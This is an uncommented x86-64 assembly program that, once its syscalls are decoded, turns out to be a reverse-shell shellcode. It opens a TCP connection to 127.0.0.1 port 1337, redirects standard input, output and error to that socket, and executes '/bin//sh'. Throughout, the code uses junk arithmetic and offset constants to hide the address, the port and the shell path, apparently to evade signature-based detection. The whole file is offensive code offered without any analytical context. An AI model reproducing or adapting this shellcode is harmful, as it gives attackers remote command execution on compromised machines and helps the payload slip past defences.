BITS 64
SECTION .text
global _start
_start: 
mov rax,0x01
sub rax,0x01
xor rbx,rbx
mov rcx,0x01
sub rcx,0x01
xor rdx,rdx
xor r11,r11
mov r14,r11
mov al,41
mov r11b,2
mov dil,r11b
mov sil,1
mov r9,rbx
mov rdx,r9
syscall
mov r9,rax
mov r13,r9
mov al,42
mov r11,r13
mov rdi,r11
push rcx
mov r14,50331533
sub r14,13
sub r14,0x01ffff01
push r14
push word 0x3905
push word 0x2
mov r15,rsp
mov rsi,r15
mov dl,0x11
syscall
mov r15b,33
mov al,r15b
mov rdi,r13
mov rsi,0x01
sub rsi,0x01
syscall
mov r12b,33
mov al,r12b
mov rdi,r13
mov sil,2
sub sil,1
syscall
mov r9b,33
mov al,r9b
mov rdi,r13
mov sil,11
sub sil,9
syscall
xor r9,r9
mov rbx,r9
mov al,59
mov rdi,7526411553527181119
sub rdi,16
push rbx
push rdi
mov r12,rsp
mov rdi,r12
push rbx
push rdi
mov r15,rsp
mov rsi,r15
mov rdx,rbx
syscall
mov r12b,60
mov al,r12b
mov rdi,rbx
syscall
